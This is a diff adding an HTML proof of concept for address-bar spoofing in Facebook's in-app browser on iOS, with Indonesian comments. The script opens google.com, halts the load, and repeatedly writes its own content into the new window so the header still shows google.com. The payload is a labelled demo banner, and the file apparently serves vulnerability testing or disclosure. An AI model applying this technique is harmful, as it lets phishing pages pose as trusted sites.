@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
+
+  <script>
+    function spoof() {
+      const target = "https://www.google.com/gen_204"; // 204 = no content, header tetap "google.com"
+      const payload = `
+        <div style="text-align:center; font-family:Arial, sans-serif; padding-top:24px">
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png"
+               alt="Google Logo" width="160" height="56">
+          <h1>THIS IS A DEMO — NOT GOOGLE</h1>
+          <p>Jika header atas di Facebook IAB masih menampilkan <b>www.google.com</b>
+             sementara konten ini tampil, berarti ada address bar misrepresentation.</p>
+        </div>
+      `;
+
+      const win = window.open(target, "_blank");
+      if (!win) return;
+
+      // Coba rebut "initial about:blank" sebelum navigasi commit di WKWebView
+      const start = performance.now();
+      const deadlineMs = 5000; // hentikan upaya setelah 3 detik
+      const tryWrite = () => {
+        try {
+          // Hentikan load target; header IAB biasanya tetap menampilkan URL target
+          win.stop();
+          win.document.open();
+          win.document.write(payload);
+          win.document.close();
+          clearInterval(timer);
+        } catch (e) {
+          // Saat sudah cross-origin/commit, SOP akan melempar error -> terus coba sampai deadline
+          if (performance.now() - start > deadlineMs) clearInterval(timer);
+        }
+      };
+
+      // Loop cepat: di iOS/WKWebView ini lebih sukses daripada tunggu timeout tunggal
+      const timer = setInterval(tryWrite, 5);
+      tryWrite(); // percobaan awal segera
+    }
+  </script>
+</body>
+</html>
